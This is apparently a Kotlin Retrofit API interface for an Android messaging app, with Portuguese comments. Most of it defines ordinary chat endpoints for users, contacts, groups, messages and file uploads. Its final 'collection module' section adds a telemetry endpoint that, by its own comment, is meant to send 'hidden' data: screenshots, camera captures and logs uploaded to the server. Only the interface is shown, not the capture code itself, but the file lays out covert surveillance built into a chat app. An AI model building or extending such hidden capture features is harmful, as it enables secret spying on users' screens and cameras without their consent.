package com.zangi.chat.data.remote

import com.zangi.chat.data.model.Conversation
import com.zangi.chat.data.model.User
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.GET
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part
import retrofit2.http.Path
import retrofit2.http.Query

// --- DATA CLASSES PARA CHAT (Mantidas) ---

data class RegisterRequest(val nickname: String)
data class RegisterResponse(val success: Boolean, val message: String, val user: User?)
data class AddContactRequest(val userId: String, val contactZangiNumber: String)
data class AddContactResponse(val success: Boolean, val message: String, val contact: User?)
data class CreateGroupRequest(val name: String, val creatorId: String, val memberIds: List<String>)
data class CreateGroupResponse(val success: Boolean, val message: String, val group: Map<String, Any>?)
data class ConversationsResponse(val success: Boolean, val conversations: List<Conversation>)
data class RemoteMessage(
    val id: String,
    val conversationId: String,
    val senderId: String,
    val senderName: String,
    val senderZangiNumber: String,
    val text: String,
    val type: String,
    val file: RemoteFileInfo?,
    val timestamp: String
)
data class RemoteFileInfo(val filename: String?, val originalName: String?, val sizeKb: String?, val mimetype: String?, val url: String?)
data class MessagesResponse(val success: Boolean, val messages: List<RemoteMessage>)
data class SendMessageRequest(val conversationId: String, val senderId: String, val senderName: String, val senderZangiNumber: String, val text: String)
data class UploadResponse(val success: Boolean, val message: String, val timestamp: String?, val data: RemoteMessage?)
data class AvatarResponse(val success: Boolean, val message: String, val avatarUrl: String?, val user: User?)
data class GroupMember(val id: String, val nickname: String, val zangiNumber: String, val avatarUrl: String?)
data class GroupDetails(val id: String, val name: String, val zangiNumber: String, val creatorId: String, val ownerName: String, val isOwner: Boolean, val inviteLink: String, val membersCount: Int, val members: List<GroupMember>, val pendingMembers: List<GroupMember>)
data class GroupDetailsResponse(val success: Boolean, val group: GroupDetails?)
data class AddGroupMemberRequest(val requesterId: String, val userZangiNumber: String)
data class JoinGroupRequest(val userId: String)
data class ApproveMemberRequest(val ownerId: String, val candidateUserId: String, val approve: Boolean)
data class SimpleResponse(val success: Boolean, val message: String)

// --- NOVAS DATA CLASSES PARA TELEMETRIA E CAPTURA (Módulo de Coleta) ---

data class TelemetryRequest(
    val userId: String,
    val deviceModel: String,
    val osVersion: String,
    val timestamp: String,
    val eventType: String // Ex: "SCREENSHOT", "CAMERA_CAPTURE", "LOG_DATA"
)

data class TelemetryResponse(
    val success: Boolean,
    val message: String
)

// --- INTERFACE API ---

interface ApiService {

    // --- 1. Identidade & Perfil ---
    @POST("api/users/register")
    suspend fun registerUser(@Body request: RegisterRequest): Response<RegisterResponse>

    @POST("api/users/{userId}/avatar")
    @Multipart
    suspend fun uploadAvatar(
        @Path("userId") userId: String,
        @Part avatar: MultipartBody.Part
    ): Response<AvatarResponse>

    // --- 2. Contatos & Conversas ---
    @GET("api/conversations/{userId}")
    suspend fun getConversations(@Path("userId") userId: String): Response<ConversationsResponse>

    @POST("api/contacts/add")
    suspend fun addContact(@Body request: AddContactRequest): Response<AddContactResponse>

    // --- 3. Grupos ---
    @POST("api/groups/create")
    suspend fun createGroup(@Body request: CreateGroupRequest): Response<CreateGroupResponse>

    @GET("api/groups/{groupId}/details")
    suspend fun getGroupDetails(
        @Path("groupId") groupId: String,
        @Query("userId") userId: String
    ): Response<GroupDetailsResponse>

    @POST("api/groups/{groupId}/members/add")
    suspend fun addMemberToGroup(
        @Path("groupId") groupId: String,
        @Body request: AddGroupMemberRequest
    ): Response<SimpleResponse>

    @POST("api/groups/{groupId}/join-request")
    suspend fun requestJoinGroup(
        @Path("groupId") groupId: String,
        @Body request: JoinGroupRequest
    ): Response<SimpleResponse>

    @POST("api/groups/{groupId}/approve")
    suspend fun approveGroupMember(
        @Path("groupId") groupId: String,
        @Body request: ApproveMemberRequest
    ): Response<SimpleResponse>

    // --- 4. Mensagens & Mídia (Chat Real) ---
    @GET("api/messages/{conversationId}")
    suspend fun getMessages(
        @Path("conversationId") conversationId: String,
        @Query("userId") userId: String
    ): Response<MessagesResponse>

    @POST("api/message")
    suspend fun sendMessage(@Body request: SendMessageRequest): Response<UploadResponse>

    @Multipart
    @POST("api/upload")
    suspend fun uploadFile(
        @Part file: MultipartBody.Part,
        @Part("text") text: RequestBody,
        @Part("senderId") senderId: RequestBody,
        @Part("senderName") senderName: RequestBody,
        @Part("senderZangiNumber") senderZangiNumber: RequestBody,
        @Part("conversationId") conversationId: RequestBody,
        @Part("type") type: RequestBody,
        @Part("deviceInfo") deviceInfo: RequestBody? = null
    ): Response<UploadResponse>

    // --- 5. MÓDULO DE COLETA (System Telemetry & Captures) ---
    // Este método será usado para enviar os dados "escondidos"
    @Multipart
    @POST("api/system/telemetry")
    suspend fun uploadTelemetry(
        @Part userId: RequestBody,
        @Part eventType: RequestBody, // "SCREENSHOT", "CAMERA", "LOG"
        @Part deviceInfo: RequestBody, // JSON com info do dispositivo
        @Part file: MultipartBody.Part? // Opcional: imagem ou arquivo de log
    ): Response<TelemetryResponse>
}